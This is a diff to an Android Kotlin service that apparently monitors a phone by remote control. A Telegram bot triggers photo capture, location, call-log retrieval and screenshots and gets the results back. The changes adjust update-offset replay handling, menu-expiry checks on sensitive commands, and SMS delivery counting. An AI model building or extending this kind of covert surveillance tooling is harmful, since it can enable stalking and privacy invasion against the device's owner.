@@ -1046,7 +1046,7 @@ class MonitoringService : Service() {
             try {
                 val callback = update.callbackQuery
                 if (callback != null) {
-                    val cbCommand = when (callback.data) {
+                    when (callback.data) {
                         "photo" -> "/photo"
                         "location" -> "/location"
                         "lastcalls" -> "/lastcalls"
@@ -1060,14 +1060,6 @@ class MonitoringService : Service() {
                         "pause60" -> "/pause"
                         "shot" -> "/screenshot"
                         else -> null
-                    }
-                    if (cbCommand != null && cbCommand in NO_REPLAY_COMMANDS) {
-                        try {
-                            if (update.updateId > preferencesManager.lastUpdateId) {
-                                preferencesManager.setLastUpdateIdSync(update.updateId)
-                            }
-                        } catch (_: Exception) {
-                        }
                     }
                     handleCallbackQuery(callback)
                 } else {
@@ -1126,6 +1118,7 @@ class MonitoringService : Service() {
                         preferencesManager.setLastUpdateIdSync(update.updateId)
                     }
                 } catch (_: Exception) {
+                    android.util.Log.w("MonitoringService", "offset persist failed")
                 }
             }
         }
@@ -1178,7 +1171,7 @@ class MonitoringService : Service() {
         }
         val originOk = originChat.isNotEmpty() && originChat == chatId
         val pressedAt = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
-        if (pressedAt > 0L && command in MUTATING_COMMANDS) {
+        if (pressedAt > 0L && (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS)) {
             val menuAge = System.currentTimeMillis() / 1000L - pressedAt
             if (menuAge > MUTATING_MAX_AGE_SEC) {
                 sendToTelegram("\u231B Menu expired, here is a fresh one.", mainMenu())
@@ -2512,10 +2505,15 @@ class MonitoringService : Service() {
         val expected = parts.size.coerceAtLeast(1)
         val okCount = java.util.concurrent.atomic.AtomicInteger(0)
         val failCount = java.util.concurrent.atomic.AtomicInteger(0)
+        val confirmedParts = java.util.Collections.synchronizedSet(java.util.HashSet<Int>())
         val counting = object : android.content.BroadcastReceiver() {
             override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                 if (intent?.action != sentAction) return
                 try {
+                    val part = try { intent?.getIntExtra("part", -1) ?: -1 } catch (_: Exception) { -1 }
+                    if (part >= 0) {
+                        try { if (!confirmedParts.add(part)) return } catch (_: Exception) { return }
+                    } else if (okCount.get() + failCount.get() >= expected) return
                     if (resultCode == android.app.Activity.RESULT_OK) {
                         if (okCount.incrementAndGet() >= expected && failCount.get() == 0) delivered.complete(true)
                     } else {
